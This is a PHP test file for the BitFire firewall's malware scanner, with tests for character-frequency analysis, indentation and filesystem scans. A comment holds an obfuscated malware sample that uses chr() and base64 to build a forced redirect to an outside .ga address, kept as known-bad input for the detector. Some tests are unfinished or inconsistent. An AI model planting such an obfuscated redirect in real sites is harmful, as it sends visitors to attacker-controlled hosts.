<?php declare(strict_types=1);

use BitFire\Malware;
use BitFire\Malware_List;
use BitFire\ScanConfig;
use ThreadFin\FileData;

use const BitFire\DS;
use const BitFire\WAF_ROOT;
use const BitFire\WAF_SRC;

use function BitFire\char_freq_analysis;
use function BitFire\cms_find_malware;
use function BitFire\file_list;
use function BitFire\get_line_indents;
use function BitFire\indent_to_space;
use function BitFire\indent_to_tab;
use function BitFire\scan_filesystem;
use function ThreadFin\un_json;

require_once WAF_ROOT . "/../wordpress-plugin/includes.php";
require_once WAF_SRC . "cms.php";

/*
function test_matching() : void {
    $sample = "555-1234, 555-9871, 555-0000";
    preg_match_all("/\d{3}-\d{4}/", $sample, $matches);
    print_r($matches);
}
*/

function test_char_freq_analysis() : void {
    $input = file_get_contents(__DIR__ . "/test_pure.php");
    $frequency = un_json(FileData::new(WAF_ROOT."cache/char_frequency.json")->raw());

    $likely = char_freq_analysis(count_chars($input), $frequency);
    assert_eq($likely, 0.0, "char_freq_analysis returned a non-zero value for a known good file");

    /*
    $malware = <<<EOL
    <?php
$c = chr(104).chr(101).chr(97).chr(100).chr(101).chr(114);
$c(base64_decode('TG9jYXRpb246IA==').chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47).chr(99).chr(108).chr(105).chr(99).chr(107).chr(46).chr(100).chr(114).chr(105).chr(118).chr(101).chr(114).chr(102).chr(111).chr(114).chr(116).chr(110).chr(105).chr(103).chr(116).chr(108).chr(121).chr(46).chr(103).chr(97).chr(47).chr(71).chr(77).chr(116).chr(67).chr(104).chr(51).chr(52).chr(83));die(); ?>
EOL;
*/

    $likely = char_freq_analysis(count_chars($malware . $input), $frequency);
    assert_gt($likely, 0.0, "char_freq_analysis returned $likely value for a known malware file");
}

function test_count_indent() : void {
    $input = file_get_contents(__DIR__ . "/test_pure.php");
    $indents  = get_line_indents($input);
    /*
    preg_match_all("/^\s+[a-zA-Z\$]/mis", $input, $matches, PREG_OFFSET_CAPTURE);
    $spaces = 0;
    $tabs = 0;
    foreach ($matches[0] as $match) {
        $counts = count_chars($match[0], 1);
        $spaces += $counts[32]??0;
        $tabs += $counts[9]??0;
        //print_r($counts);
    }
    echo "spaces: $spaces, tabs: $tabs\n";
    */
    $spaces = indent_to_space($indents);
    $tabs = indent_to_tab($indents);
    //$tabs = $indents & 0x3FFF8000;
    echo "indents $indents [$spaces] [$tabs]\n";
    //print_r($matches);
    assert_true(true, "tested");
}

function test_all() : void {
    $malware_files = glob(__DIR__ . DS . "malware" . DS . "*.php");
}

function test_find_malware() : void {
    $config = new ScanConfig();
    /** @var Malware_List $list */
    $file = __DIR__ . DS . "malware" . DS . "options.php";
    $file = "/var/www/wordpress/wp-login.php";
    $list = cms_find_malware($file, false, 0, $config);
    //print_r($list);
    //assert_gt(count($list), 8, "find malware should have returned 1 for every malware function");
    /** @var Malware $malware */
    //$malware = $list->offsetGet(0);
    //assert_gt($malware->php_count, 1, "did not find double php open");

    //print_r($list);
}

function test_scan_filesystem() : void {
    //phpinfo();
    //die();
    $dir = "/var/www/wordpress";///wp-content/plugins";
    //file_list($dir);
    $offset = 0;
    $done = false;
    //die();
    while (!$done && $offset < 200) {
        $list = scan_filesystem($dir, $offset, 200);
        print_r($list);
        /*
        if (count($list) > 0) {
            print_r($list);
        }
        */

        if ($list->num_scanned < 10) { 
            $done = true;
        }
        $offset += $list->num_scanned;
    }
    /*
    print_r($list);
    $list = scan_filesystem($dir, 100, 100);
    print_r($list);
    $list = scan_filesystem($dir, 200, 100);
    print_r($list);
    */
    //echo "FIN!\n";
}